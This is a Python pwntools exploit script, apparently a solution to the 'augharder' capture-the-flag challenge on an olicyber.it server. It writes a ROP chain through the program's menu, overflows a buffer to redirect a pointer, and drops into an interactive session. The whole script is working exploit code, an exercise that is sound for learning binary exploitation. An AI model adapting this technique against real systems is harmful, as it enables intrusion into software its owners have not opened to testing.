#!/usr/bin/env python3

from pwn import *

exe = ELF("./augharder_patched")

context.binary = exe
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("augharder.challs.olicyber.it", 10607)
    else:
        r = gdb.debug(exe.path, '''
            b *main+208
            c
        ''')

    return r


def main():
    r = conn()

    POP_ESI_EDI = 0x08048ca9

    exploit = flat(
        b'A' * 30,
        p32(exe.sym['lista_film'] + 0x4),
    )
    rop = [
        exe.sym['beta_write'],
        0,
        exe.sym['film_preferito'],
        100,
    ]

    for i, e in enumerate(rop):
        r.recvuntil(b'scelta > ')
        r.sendline(b'3')
        r.recvuntil(b': ')
        r.sendline(str(i+1).encode())
        r.recvuntil(b': ')
        r.sendline(str(e).encode())
    
    r.recvuntil(b'scelta > ')
    r.sendline(b'5')
    r.recvuntil(b': ')
    r.sendline(exploit)

    r.interactive()


if __name__ == "__main__":
    main()
